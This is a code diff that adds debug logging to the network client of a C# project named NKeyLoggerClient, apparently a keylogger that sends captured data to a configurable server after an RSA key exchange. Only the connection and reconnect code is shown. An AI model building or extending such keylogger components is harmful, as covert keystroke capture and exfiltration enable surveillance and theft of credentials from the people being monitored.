@@ -7,6 +7,7 @@ using System.Reflection.Metadata;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
+using Microsoft.Extensions.Logging;
 using NKeyLoggerLib;
 
 namespace NKeyLoggerClient;
@@ -40,12 +41,15 @@ internal class NetworkClient : ISender, IDisposable
             if (port >= 0xFFFF || port <= 0)
                 throw new ApplicationException("Error parse settings: invalid port");
             string address = settings.Properties["address"];
+            Log<NetworkClient>.Instance.logger?.LogDebug($"Load settings into network client:\n reconnect time - {reconnectTime}\n" +
+                $"port - {port}\n address - {address}\n");
         } catch(Exception) {
             if (settings is Setting s)
             {
                 s.insert("address", "localhost");
                 s.insert("port", "56535");
                 s.insert("reconnect", "5000");
+                Log<NetworkClient>.Instance.logger?.LogDebug("Load default settings into network client");
             }
         }
     }
@@ -62,6 +66,7 @@ internal class NetworkClient : ISender, IDisposable
     }
     private void reconnect(object? sender, System.Timers.ElapsedEventArgs e)
     {
+        Log<NetworkClient>.Instance.logger?.LogDebug($"Reconnect network client {e.SignalTime.ToString("D")}");
         if(!client.socket.Connected)
             connect();
     }
@@ -69,6 +74,7 @@ internal class NetworkClient : ISender, IDisposable
     {
         var reconn = () =>
         {
+            Log<NetworkClient>.Instance.logger?.LogDebug($"Network client trying reconnect to {settings.Properties["address"]}");
             disconnect();
             client = new Network();
         };
@@ -84,6 +90,7 @@ internal class NetworkClient : ISender, IDisposable
             try
             {
                 client.socket.Connect( settings.Properties["address"], int.Parse(settings.Properties["port"]) );
+                Log<NetworkClient>.Instance.logger?.LogDebug($"Network client connected to {settings.Properties["address"]}");
                 List<byte> dataOpenKey = client.recvAsync().Result.data;
                 rsa.ImportRSAPublicKey(dataOpenKey?.ToArray(), out _);
             }
@@ -100,6 +107,7 @@ internal class NetworkClient : ISender, IDisposable
     {
         if ( !client.socket.Connected )
             return;
+        Log<NetworkClient>.Instance.logger?.LogDebug($"disconnect network client {DateTime.Now.ToString("D")}");
         client.Dispose();
     }
 
